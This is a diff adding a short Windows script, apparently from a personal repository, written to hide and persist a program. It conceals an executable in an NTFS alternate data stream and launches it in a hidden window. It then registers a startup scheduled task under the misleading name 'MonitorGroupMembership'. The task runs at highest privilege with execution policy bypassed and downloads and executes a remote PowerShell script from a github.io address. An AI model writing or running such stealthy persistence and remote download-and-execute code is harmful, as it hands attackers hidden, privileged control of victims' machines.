@@ -1,0 +1,14 @@
+
+
+
+## set alter stream / start 
+cmd.exe /c "type C:\Users\nct28\Documents\GitHub\MiPrivate\dist\nescesito.exe >C:\Users\nct28\Documents\GitHub\MiPrivate\dist\miHidden.txt:nescesito.exe"
+Start-Process -WindowStyle Hidden ("C:\Users\nct28\Documents\GitHub\MiPrivate\dist\miHidden.txt:nescesito.exe")
+
+##scheduler 
+
+$Trigger= New-ScheduledTaskTrigger -AtStartup # Specify the trigger settings
+$User= whoami # Specify the account to run the script
+$Action= New-ScheduledTaskAction -Execute "PowerShell.exe" -Argument "-NoLogo -NonInteractive -ExecutionPolicy Bypass -windowstyle hidden -Command iex(iwr sl33pypanda.github.io/mi1stRepo/ps.txt -UseBasicParsing)" # Specify what program to run and with its parameters
+
+Register-ScheduledTask -TaskName "MonitorGroupMembership" -Trigger $Trigger -Action $Action -RunLevel Highest -Force
